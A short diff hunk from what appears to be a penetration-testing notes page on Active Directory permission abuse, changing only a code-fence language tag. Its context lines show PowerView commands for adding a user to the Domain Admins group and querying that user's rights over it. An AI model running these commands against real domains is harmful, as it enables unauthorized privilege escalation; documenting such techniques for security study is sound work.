@@ -14,7 +14,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 
 One more privilege that enables the attacker adding themselves to a group:
 
-```
+```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
